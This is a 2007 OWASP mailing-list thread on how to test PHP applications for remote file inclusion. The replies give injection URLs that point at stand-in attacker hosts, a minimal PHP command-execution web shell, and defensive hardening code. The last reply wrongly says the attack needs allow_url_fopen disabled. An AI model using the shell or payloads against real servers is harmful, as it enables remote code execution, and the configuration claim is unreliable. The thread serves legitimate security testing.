From denise.spi at gmail.com  Tue Apr 10 12:45:00 2007
From: denise.spi at gmail.com (Denise Spiteri)
Date: Tue, 10 Apr 2007 08:45:00 -0800
Subject: [Owasp-testing] Remote File include vulnerability
Message-ID: <d7559bfd0704100945m3b6cef68uc90da5457a7be952@mail.gmail.com>

Hi to all,

            Can someone please tell me, how to carry out penetration testing
for Remote File Include Vulnerability?

Denise
-------------- next part --------------
An HTML attachment was scrubbed...
URL: http://lists.owasp.org/pipermail/owasp-testing/attachments/20070410/8096f07d/attachment.html 

From David.Byrne at echostar.com  Tue Apr 10 13:25:39 2007
From: David.Byrne at echostar.com (Byrne, David)
Date: Tue, 10 Apr 2007 11:25:39 -0600
Subject: [Owasp-testing] Remote File include vulnerability
In-Reply-To: <d7559bfd0704100945m3b6cef68uc90da5457a7be952@mail.gmail.com>
Message-ID: <1BAAFB74C5643343B75CF51A121690FB0C0A8332@MER2-EXCHA1.echostar.com>

Denise,

 

In my experience, you usually need the source code to do this. The idea
is that on some platforms (mostly PHP), script files can be included at
runtime. 

 

               include($base_path . "/utils.php");

 

If register_globals is enabled (older versions of PHP enable it by
default), and base_path is never initialized in the script, base_path
can be set from the URL

            

 
http://example.com/bad.php?base_path=http://attack.com/evil.php

 

This will run the attack PHP file on the victim web server. I've seen
this happen mostly on files that are not intended to be called alone.
For example, a utility library that usually gets included after a
configuration file that sets base_path.

 

I don't know of effective methods for testing this without access to the
code. I suppose a particularly poorly written app might have a path in
the URL query by design, which could then be modified. You could also
try to use common variable names (like base_path), although you would
still have to find a vulnerable script which is probably never called
directly by a browser.

 

David Byrne

OWASP-Denver Leader

 

 

 

________________________________

From: owasp-testing-bounces at lists.owasp.org
[mailto:owasp-testing-bounces at lists.owasp.org] On Behalf Of Denise
Spiteri
Sent: Tuesday, April 10, 2007 10:45 AM
To: owasp-testing
Subject: [Owasp-testing] Remote File include vulnerability

 

Hi to all, 

 

            Can someone please tell me, how to carry out penetration
testing for Remote File Include Vulnerability?

 

Denise

 

-------------- next part --------------
An HTML attachment was scrubbed...
URL: http://lists.owasp.org/pipermail/owasp-testing/attachments/20070410/45315256/attachment.html 

From vanderaj at owasp.org  Tue Apr 10 13:29:32 2007
From: vanderaj at owasp.org (Andrew van der Stock)
Date: Tue, 10 Apr 2007 13:29:32 -0400
Subject: [Owasp-testing] Remote File include vulnerability
In-Reply-To: <d7559bfd0704100945m3b6cef68uc90da5457a7be952@mail.gmail.com>
Message-ID: <C24141BC.365A%vanderaj@owasp.org>

Hi there,

You will generally find a construct like this:

require ($foo.?.inc.php?);

To obviate this, you need to do two things:

Install a file somewhere on the Internet or on your computer if you?re
testing locally (recommended). I like

<?php
echo "pwned";
exit;
?>

Change the variable, foo, to point at your script. If $foo is from a
variable from the user, like foo in the post, get or cookie collection, you
need something like a browser or at worst, Firefox Web Developer toolbar or
WebScarab to modify the contents of foo to:

http://www.example.com/hostile.php?dummy=

That way, your script is called like this:

http://www.example.com/hostile.php?dummy=.inc.php

The PHP interpreter (which will almost always have allow_url_fopen turned on
? STUPID!, STUPID!, STUPID! A friendly message to our PHP developer friends)
will then retrieve, tokenize and execute your script as if it were local to
the file system.

My view is that scripts should have the following code before any include /
require statements and definitely before any file or stream operations:

if ( ini_get(?allow_url_fopen?) == ?1? &&
        @ini_set(?allow_url_fopen?, ?0?) === false ) {
    die ?Cannot continue ? allow_url_fopen is set to 1, which is extremely
dangerous. Disable this in php.ini before continuing?;
}
// PHP 5.2.0 and later
if ( ini_get(?allow_url_include?) == ?1? &&
        @ini_set(?allow_url_include?, ?0?) === false ) {
    die ?Cannot continue ? allow_url_fopen is set to 1, which is extremely
dangerous. Disable this in php.ini before continuing?;
}

Andrew
 


On 4/10/07 12:45 PM, "Denise Spiteri" <denise.spi at gmail.com> wrote:

> Hi to all, 
>  
>             Can someone please tell me, how to carry out penetration testing
> for Remote File Include Vulnerability?
>  
> Denise
>  
> 
> 
> _______________________________________________
> Owasp-testing mailing list
> Owasp-testing at lists.owasp.org
> http://lists.owasp.org/mailman/listinfo/owasp-testing




From josh at ramat.cc  Tue Apr 10 13:32:01 2007
From: josh at ramat.cc (Josh Zlatin-Amishav)
Date: Tue, 10 Apr 2007 13:32:01 -0400 (EDT)
Subject: [Owasp-testing] Remote File include vulnerability
In-Reply-To: <d7559bfd0704100945m3b6cef68uc90da5457a7be952@mail.gmail.com>
References: <d7559bfd0704100945m3b6cef68uc90da5457a7be952@mail.gmail.com>
Message-ID: <Pine.LNX.4.61.0704101316410.10028@zur>

On Tue, 10 Apr 2007, Denise Spiteri wrote:

> Hi to all,
>
>           Can someone please tell me, how to carry out penetration testing
> for Remote File Include Vulnerability?

Most of the remote file include vulnerabilities reported are for PHP
apps which use the value of a user supplied variable to include PHP code
which is then executed by the server. Often times it is obvious from the
variable name or value that the variable is including code from another
file, but a complete code review will be more complete.

To test for remote file includes you should at a minimum manipulate the
given variable to include a remote file that will execute some code on 
the target. For PHP apps you can try a simple shell script like:

<?
$cmd = $_GET["cmd"]; print "[$cmd]\n";system($cmd);
?>

and then call your script via the vulnerable variable like:

http://[target]?index=http://attacker/cmd?&cmd=ls;foo=

where 'index' is a variable that includes remote PHP code. Remote file
includes are dependent on the server having allow_url_fopen disabled. If
the allow_url_fopen was enabled I might try for a directory transversal
attack instead.

--
  - Josh

